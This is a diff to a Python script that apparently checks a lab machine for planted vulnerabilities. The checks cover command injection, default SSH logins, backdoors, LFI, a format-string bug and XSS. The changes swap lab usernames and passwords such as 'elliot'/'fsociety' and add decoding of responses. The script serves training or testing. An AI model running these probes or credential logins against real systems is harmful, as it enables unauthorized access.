@@ -22,7 +22,8 @@ class test_vulns():
             return None
         log.debug(results)
         conn.close()
-        if "jackbauer" in results:
+        results = results.decode()
+        if "elliot" in results:
             log.info(ip + " VULNERABLE to cmd injection")
             return True
         else:
@@ -70,6 +71,7 @@ class test_vulns():
             return None
         log.debug(results)
         shell.close()
+        results = results.decode()
         if username in results:
             log.info(ip + " VULNERABLE to default ssh " + username)
             return True
@@ -92,7 +94,7 @@ class test_vulns():
                     conn.send("ls /home/\n")
                     results = conn.recv()
                     conn.close()
-                if "jackbauer" in results:
+                if "elliot" in results:
                     log.info(ip + " VULNERABLE to backdoor 1")
                     return True
             except:
@@ -111,6 +113,7 @@ class test_vulns():
         except:
             log.info("Error connecting to backdoor 2 " + ip)
             return None
+        results = results.decode()
         if "www-data" in results:
             log.info(ip + " VULNERABLE to backdoor 2")
             return True
@@ -131,7 +134,8 @@ class test_vulns():
         except:
             log.info("Error performing web request to ")
             return None
-        if "surnow" in results:
+        results = results.decode()
+        if "mrrobot" in results:
             log.info(ip + " VULNERABLE to lfi")
             return True
         else:
@@ -146,6 +150,7 @@ class test_vulns():
         @param username: username to login with over ssh
         @param pw: password to login with over ssh
         """
+        shell = None
         if keyfile:
             try:
                 shell = ssh(username, ip, keyfile=keyfile)
@@ -161,7 +166,7 @@ class test_vulns():
                 return False
         results = ""
         results = shell[
-            "/home/jackbauer/services/c/formatme_local/printf %x%x%x"]
+            "/home/elliot/services/c/formatme_local/printf %x%x%x"]
         evaluation = re.match(
             "[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]", results)
         log.info(results)
@@ -187,6 +192,7 @@ class test_vulns():
             log.info("Failed to connect to reflected XSS " + ip)
             return None
         log.debug(results)
+        results = results.decode()
         if "<img src=x onerror=alert(1)>" in results:
             log.info(ip + " VULNERABLE to reflected xss")
             return True
@@ -237,7 +243,7 @@ class test_vulns():
         if not results:
             return False
 
-        if 'document.write("<a href=" + decodeURIComponent(document.baseURI)' in results:
+        if 'document.write("<a href=" + decodeURIComponent(document.baseURI)' in results.decode():
             log.info(ip + " VULNERABLE to dom based XSS")
             return True
         else:
@@ -274,18 +280,18 @@ class test_vulns():
             log.info(ip + " NOT VULNERABLE to arbitrary file upload")
             return False
 
-    def test_ssh_jackbauer(self, ip):
-        return self.test_ssh_default(ip, "jackbauer", "devgru6")
+    def test_ssh_elliot(self, ip):
+        return self.test_ssh_default(ip, "elliot", "fsociety")
 
-    def test_ssh_chloe(self, ip):
-        return self.test_ssh_default(ip, "chloe", "chloechloe")
+    def test_ssh_mrrobot(self, ip):
+        return self.test_ssh_default(ip, "mrrobot", "mrrobot")
 
-    def test_ssh_surnow(self, ip):
-        return self.test_ssh_default(ip, "surnow", "surnowsurnow")
+    def test_ssh_trenton(self, ip):
+        return self.test_ssh_default(ip, "trenton", "trenton")
 
 
 if __name__ == "__main__":
-    ip_addr = "192.168.3.117"
+    ip_addr = "192.168.66.2"
     t = test_vulns()
     context.log_level = "info"
     t.test_arbitrary_file_upload(ip_addr)
@@ -293,9 +299,9 @@ if __name__ == "__main__":
     t.test_sqli(ip_addr)
     t.test_cmd_injection(ip_addr)
     t.test_buffer_overflow(ip_addr)
-    t.test_ssh_jackbauer(ip_addr)
-    t.test_ssh_chloe(ip_addr)
-    t.test_ssh_surnow(ip_addr)
+    t.test_ssh_elliot(ip_addr)
+    t.test_ssh_mrrobot(ip_addr)
+    t.test_ssh_trenton(ip_addr)
     t.test_backdoor_1(ip_addr)
     t.test_backdoor_2(ip_addr)
     t.test_lfi(ip_addr)
